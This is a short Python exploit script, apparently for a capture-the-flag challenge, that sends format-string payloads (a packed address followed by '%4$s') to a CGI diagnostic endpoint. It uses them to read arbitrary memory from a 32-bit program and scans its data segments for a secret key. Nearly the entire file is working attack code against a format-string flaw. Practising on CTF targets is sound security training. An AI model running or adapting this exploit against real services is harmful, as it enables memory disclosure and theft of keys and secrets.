#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    with urllib.request.urlopen(url) as resp:
        return resp.read()

def extract_diag(raw):
    marker = b'DIAG '
    idx = raw.find(marker)
    if idx >= 0:
        return raw[idx+5:].rstrip(b'\r\n')
    return b''

def read_mem(addr, length=16):
    # Skip payload address bytes (4 bytes) and use a marker
    payload = struct.pack('<I', addr) + b"M%4$s"
    res = extract_diag(send_msg_raw(payload))
    marker = b"M"
    idx = res.find(marker)
    if idx >= 0:
        return res[idx+1:]
    return b""

print("=== Scanning BSS/Data segments for the key ===")
# Common BSS/Data range for small 32-bit ELF
for addr in range(0x08049000, 0x0804c000, 16):
    data = read_mem(addr)
    # Check if this could be our key
    # A 16-byte random block
    if len(data) >= 16:
        # Check if it has the Project Epoch signature or looks like a key
        # Key is loaded from file, so it's likely random-looking
        if not data.startswith(b"\x00\x00") and b"msn" not in data.lower():
             # Check if it's the key!
             # Let's see if 0x0804a010 (data/msn_epoch.key) is near
             pass
    
    # Let's just print anything that isn't all zeros or common strings
    if len(data) > 4 and data[:4] != b"\x00\x00\x00\x00":
        if b"Diagnostic" not in data and b"MILLENNIUM" not in data:
            print(f"0x{addr:08x}: {data[:16].hex()} | {repr(data[:16])}")

    time.sleep(0.01)
